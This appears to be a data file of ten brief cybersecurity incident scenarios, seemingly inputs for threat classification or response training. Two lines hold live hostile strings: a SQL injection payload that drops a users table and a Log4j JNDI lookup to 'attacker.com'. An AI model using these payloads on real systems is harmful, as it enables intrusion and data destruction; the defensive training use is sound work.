threat_description: Email from spoofed CEO domain requesting urgent wire transfer with fake DocuSign link at http://docusign-secure.ceo-financials.com/sign. Email sent at 2:47 AM, real domain is company.com.
Login form receives payload: admin' OR '1'='1'; DROP TABLE users; --
Server receives 847 requests/sec from 1200 different IPs across multiple countries. Legitimate user traffic is being blocked entirely.
All files on the network share are encrypted and renamed with .locked extension. A ransom note demands $500,000 in Bitcoin within 72 hours or keys will be destroyed.
Antivirus detects outbound traffic to 185.220.101.x at irregular intervals. System processes silently spawning cmd.exe and powershell.exe with encoded payloads.
Public-facing Apache Log4j server is receiving specially crafted JNDI lookup strings in User-Agent headers: ${jndi:ldap://attacker.com/a}. Remote code execution observed.
Senior database administrator is accessing and exporting large volumes of customer PII records outside business hours, copies to personal USB drives, and has submitted a resignation.
SSL/TLS certificate mismatch detected on internal API gateway. Unencrypted credentials found in intercepted HTTP sessions between employee laptops and the login portal.
Multiple user accounts report receiving password reset emails they did not request. Attacker used email enumeration on the password reset endpoint to identify valid accounts.
Network scanner detects a Windows SMB vulnerability CVE-2017-0144 (EternalBlue) being exploited across internal hosts. Lateral movement observed with admin share access.
